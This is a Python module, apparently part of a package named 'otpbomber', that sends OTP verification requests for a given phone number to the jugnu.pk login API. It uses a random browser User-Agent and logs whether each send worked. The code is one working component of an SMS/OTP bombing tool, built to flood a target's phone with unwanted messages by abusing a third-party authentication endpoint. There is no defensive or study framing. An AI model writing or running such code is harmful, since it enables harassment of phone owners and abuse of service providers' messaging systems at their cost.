from otpbomber.core import *
from otpbomber.localuseragent import *

async def jugnu_voice(phone, client, out):
    name = 'jugnu_voice'
    domain = 'jugnu.pk'
    frequent_rate_limit = False
    headers = {'User-Agent': random.choice(ua['browsers']['chrome']), 'Content-Type': 'application/json'}
    payload = {'phone': f'0{phone[-10:]}'}
    try:
        response = await client.post('https://api.jugnu.pk/v1/auth/otp/send', headers=headers, json=payload)
        if response.status_code == 200:
            out.append({'name': name, 'domain': domain, 'sent': True, 'error': False, 'rateLimit': False})
        else:
            out.append({'name': name, 'domain': domain, 'sent': False, 'error': False, 'rateLimit': False})
    except Exception:
        out.append({'name': name, 'domain': domain, 'sent': False, 'error': True, 'rateLimit': False})